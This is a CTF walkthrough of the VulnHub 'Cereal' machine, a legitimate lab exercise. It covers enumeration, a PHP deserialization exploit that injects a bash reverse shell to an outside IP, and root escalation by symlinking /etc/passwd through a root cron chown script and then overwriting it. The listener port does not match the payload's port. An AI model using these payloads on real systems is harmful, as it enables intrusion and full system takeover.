# Cereal VulnHub
### Difficulty : Medium

Hey There, Welcome to my walkthrough guide on how to pwn the cereal machine.

## Enumeration 

now we must begin enumerating to discover what services are running on the machine. but before we do that we must first of all discover the target IP address of our target machine. this can be done by using the command below.

**command**: ``` netdiscover -i interface_name ```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/1.png)

## Port Scanning

we have successfully discovered what our target IP is. now let's run an nmap scan to discover what open ports and services are running on the target machine and what services can be exploited to gain foothold.

```

```

from the scan above, we can see that we have quite a list of ports on the machine but what comes to mind first is the ***FTP*** port.

now lets begin with ***FTP*** Enumeration.

***FTP*** stands for "File Transfer Protocol." It is a standard network protocol used for transferring files between a client and a server on a computer network. ***FTP*** allows users to upload, download, and manipulate files and directories on a remote server, making it a common method for sharing and managing files over the internet. It provides a simple and efficient way to transfer files, making it widely used in various applications, including website maintenance and file sharing.


![Markdown Logo](/home/d4rk5id3/Documents/cereal/2.png)

we can see from our nmap scan that the FTP has anonymous login allowed. this means that we can login to the ***FTP*** server without providing specific login credentials such as a username and password.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/3.png)

after successful login, by navigating the directories we find nothing interesting. so lets move unto the next stage of our enumeration process ***SSH***


![Markdown Logo](/home/d4rk5id3/Documents/cereal/4.png)

it can be seen that we need a password to authenticate via SSH. so its kind of like a dead end for now. lets proceed to enumerating port 80(HTTP)

so from basic knowlege we know that http is always running a web service so we should expect to see a website hosted and running on our machine. so letâ€™s visit the IP address in our browser which will access port 80 by default.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/5.png)

so what we can see is basically an apache web server default page what comes to mind after this is directory enmuration. we would try to find other directories on the web server by bruteforcing with a list of common directory names. 

for this walkthrough i have decided to use gobuster which is a tool i love but you can also use any one of your choice.

***command***: ```gobuster dir -u http://<ip_address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/6.png)

we have identified two directories ***admin*** and ***blog***. let's head over to see what we would get.

# Enumerating Admin Directory

![Markdown Logo](/home/d4rk5id3/Documents/cereal/7.png)

Navigating to the site we see that it has a login page:
basically i tried some SQL injection and brute force attack with a list of common default passwords but it was quite useless.

# Enumerating Blog Directory

![Markdown Logo](/home/d4rk5id3/Documents/cereal/8.png)

we can see a page about an update post which notifies the users about some backup restoration for the website ***http://cereal.ctf***. but we also notice that the web page does not resolve pretty well in our browser. an easy fix for this would be to add the ***/etc/hosts*** file on our attacker machine so that the domain resolves to the machine IP address.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/9.png)

we can now see that our website displays properly.


![Markdown Logo](/home/d4rk5id3/Documents/cereal/10.png)


scrolling over to the bottom of the page we discover that the website is powered by wordpress.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/11.png)

website most times can be misconfigured to run vulnerable plugins or themes which can be exploited by attackers. now that we have a domain lets attempt to scan for other Sub-domains that could be on the server.

***command***: ```ffuf -u 'http://cereal.ctf' -H 'Host: FUZZ.cereal.ctf' -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -fw 1,22027```


![Markdown Logo](/home/d4rk5id3/Documents/cereal/12.png)

with our scan now  complete  we can see that we have no other sub-domains available. now lets move over to the other ports that are open on the server.


# Enumerating Dead Ports

It seems the following ports do not respond when we ran a scan against the IP:

139, 445, 3306, 11111, 22222, 22223, 33333, 33334, 44441, 55551, 55555

so lets try accessing them manually.

while enumerating the ports we can see that port 44441 is running a web server that says ***"Coming soon..."***.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/13.png)

we can now attempt to scan for subdomains on this port.

***command***: ```ffuf -u 'http://cereal.ctf:44441' -H 'Host: FUZZ.cereal.ctf' -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -fw 2```

with our scan successful we discovered a sub-domain ***secure.cereal.ctf***


![Markdown Logo](/home/d4rk5id3/Documents/cereal/14.png)

now that we have added theis to our host file lets head over to the page on our web browser.


![Markdown Logo](/home/d4rk5id3/Documents/cereal/15.png)

so we can see a ping scan website. so a common technique i try out whenever i find an input field like this is to first check for command injection vulnerability.


![Markdown Logo](/home/d4rk5id3/Documents/cereal/16.png)

but after multiple attempts it doesn't work. so we can say that it isn't vulnerable to command injection.

it looks like it may be vulnerable to a ***PHP deserialization attack***.

so a ***PHP deserialization attack*** is the process of converting serialized data into objects or data structures in PHP. However, if not handled properly, it can be a serious security vulnerability. ***attackers can manipulate serialized data to execute arbitrary code or perform unauthorized actions on the server***

we can attempt to find a php backup file to aid us in understanding how it works.

to do this we would be making use of a wordlist scanner which attempts to find the back_en directory. 

***Note***: this directory might not be avialable on all the wordlists. but luckily it is available on ***directory-list-2.3-big.txt***

***command***: ```gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/17.png)

![Markdown Logo](/home/d4rk5id3/Documents/cereal/18.png)


visiting the page we get a 403 error, so we cant access the files that are in there.

now that we have successfully discovered the back_en directory lets try to find the php backup file.

we would be making use of gobuster  with the -x flag to specify the file extension we are searching for.

we would be searching for the following extensions .back, .bak. and .backup.

***command***: ```gobuster dir -u http://secure.cereal.ctf:44441/back_en -x .bak -w /usr/share/wordlists/dirb/common.txt```


![Markdown Logo](/home/d4rk5id3/Documents/cereal/19.png)

we can see that our scan has discovered a php backup file with a status code 200 this means that we can access it, so lets head over and check it out.

so i downloaded the file unto my system using wget. lets cat it out to see what we find.


![Markdown Logo](/home/d4rk5id3/Documents/cereal/20.png)

from the file file we can see the following:

```<?php

class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = False;
        public $output = "";

        function validate() {
                if (!$this->isValid) {
                        if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
                        {
                                $this->isValid = True;
                        }
                }
                $this->ping();

        }

        public function ping()
        {
                if ($this->isValid) {
                        $this->output = shell_exec("ping -c 3 $this->ipAddress");
                }
        }

}

if (isset($_POST['obj'])) {
        $pingTest = unserialize(urldecode($_POST['obj']));
} else {
        $pingTest = new pingTest;
}

$pingTest->validate();

echo "<html>
<head>
<script src=\"http://secure.cereal.ctf:44441/php.js\"></script>
<script>
function submit_form() {
                var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});
                object = object.substr(object.indexOf(\"{\"),object.length);
                object = \"O:8:\\\"pingTest\\\":1:\" + object;
                document.forms[\"ipform\"].obj.value = object;
                document.getElementById('ipform').submit();
}
</script>

    <div class=\"form-holder\">

            <div class=\"form-items\">
                <h3>Ping Test</h3>

                <form method=\"POST\" action=\"/\" id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>

                    <div class=\"col-md-12\">
                        <input name=\"obj\" type=\"hidden\" value=\"\">
                       <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>
                    </div>
                <br />
                    <div class=\"form-button mt-3\">
                        <input type=\"submit\" value=\"Ping!\">

                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
</div>
</body>
</html>";

?>
```

The script seems to accept a serialized pingTest object via HTTP POST. It then deserializes the object passed from HTTP post, calls the validate function, and in turn calls the ping function. We can therefore see that when we type in an IP address on the web form and click submit, Javascript serializes the object ready for PHP, and then passes that object to the PHP script. The script validates the IP address value within the object and then proceeds to ping it if the IP address is vaild.

To ping the IP address, the shell_exec command is called which simply executes the command on the local system. The reason our initial command injection attempt didnâ€™t work was because our IP Address input did not pass the IP address validation.

However, as the script unseriealizes the entire pingTest object submitted via HTTP post, we can look to set the â€˜isValidâ€™ boolean, and trick the script into thinking the IP address with an additional command we supply is valid, gaining remote code execution on the system.

When we ping a website from the web form, we see the serialized object being sent from the web form to the PHP script. Only the ipAddress variable is supplied though â€“ isValid is not supplied by the web form at all.

captured request in burp suite:

![Markdown Logo](/home/d4rk5id3/Documents/cereal/21.png)

now lets create a payload, injecting our own command but supplying the isValid variable to bypass IP validation. To do this, we can create a PHP file on our attacker system:




``` 
<?php

class pingTest {
        public $ipAddress = " ; bash -c 'bash -i >& /dev/tcp/192.168.43.110/4444 0>&1'";
        public $isValid = True;

}

echo urlencode(serialize(new pingTest));

?>

 ```

 now we save this file and run it using 

 ***command***: php <file_name>

now we get a URl Encoded serialized object which we would input into the burp suite intercepted request.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/22.png)


let's not forget to setup our listener on the same port used in the php script.

***command***: nc -lnvp 80

![Markdown Logo](/home/d4rk5id3/Documents/cereal/23.png)

now we send our intercepted request to repeater and foward the request so we can get our reverse shell comnection.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/24.png)

after sending our request in the burp repeater we now have our reverse shell connection.

![Markdown Logo](/home/d4rk5id3/Documents/cereal/25.png)

The reason this works is because the isValid variable has been set to True, so the script skips IP Address validation and passes our input directly to the shell_exec function. Therein lies the vulnerability.

## Privilege Escalation

so first of all we  need to upgrade our shell using bash since  python isn't installled on the target system 

***command*** : ```SHELL=bash script -q /dev/null```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/26.png)

![Markdown Logo](/home/d4rk5id3/Documents/cereal/27.png)

now that we have access and an upgraded shell we can attempt to check for other users in machine

***commmand***:```cat /etc/passwd | grep bash ```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/28.png)

we would be making use of pspy to snoop on the processes without requiring root permission. Likewise, linpeas and linenum are some of the Linux enumeration scripts.

now we must start up a python server to enable us transfer the file to our target machine.

***command***: ``` python3 -m http.server 6000```


![Markdown Logo](/home/d4rk5id3/Documents/cereal/29.png)

now we must go under the ***/tmp*** directory and download our file there 

```
cd /tmp

wget http://<ip>:6000/pspy64

chmod +x pspy64

```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/30.png)

now with our file transfer process complete let's begin snooping processes.

***command***: ```./pspy64```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/31.png)


after a while i discovered a script which runs by the root user. let's attempt to view the file.

***command***: ```ls -l /usr/share/scripts/chown.sh```
```cat /usr/share/scripts/chown.sh```
![Markdown Logo](/home/d4rk5id3/Documents/cereal/32.png)

![Markdown Logo](/home/d4rk5id3/Documents/cereal/33.png)
it can be seen that we dont have write permission to edit the script. so we cannot write our own commands.

the script is changing the owner of the contents of the file ***public_html*** that resides on the home directory of the user ***rocky***.

we are currently in the apache group so it would give us access to the files located inside the directory. in linux we have something called ***symlink***. it is similar to the shortcuts in windows except that windows use extensions to verify its files. on the other hand, Linux makes use of permissions.


### Exploiting the cron Job
now to exploit this, we would need to change the owner of the symlink which would in some way also change the owner of the linked file.

***command***: ```symlink with group owner```

```apache -> Original file with/without group owner apache but has group write access```

now, luckily the /etc/passwd has the write access for its group.

```ls -l /etc/passwd```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/34.png)

```cat /etc/passwd```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/35.png)

the ***x*** in the ***/etc/passwd*** file is the location where our 'encrypted' password is kept.

so if we removed the ***'x'*** from it, i would successfully remove the authentication from the root user.

now let's start with symlinking ***/etc/passwd*** file to a custom file.

```ln -s /etc/passwd /home/rocky/public_html/passwd```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/36.png)

now with the symlink sucessfully created let's wait for the script to execute.

since the script is executed let's check the owner of the /etc/passwd.

***command***: ```ls -l /etc/passwd```

![Markdown Logo](/home/d4rk5id3/Documents/cereal/37.png)

now, we edit the file.

***command***: ```echo root::0:0:root:/root:/bin/bash > /etc/passwd```


![Markdown Logo](/home/d4rk5id3/Documents/cereal/38.png)

now we can simply login as root user by simply using the **su** command.

``` 
su 
```
now to locate the user flag we move to the following path 

``` 
cd /home/rocky/

ls

cat local.txt
 ```

***user flag***: ***aaa87365bf3dc0c1a82aa14b4ce26bbc***

![Markdown Logo](/home/d4rk5id3/Documents/cereal/39.png)


the root flag is located in the root directory

```
cd /root

cat proof.txt

```
***root flag***: ***1aeb5db4e979543cb807cfd90df77763***
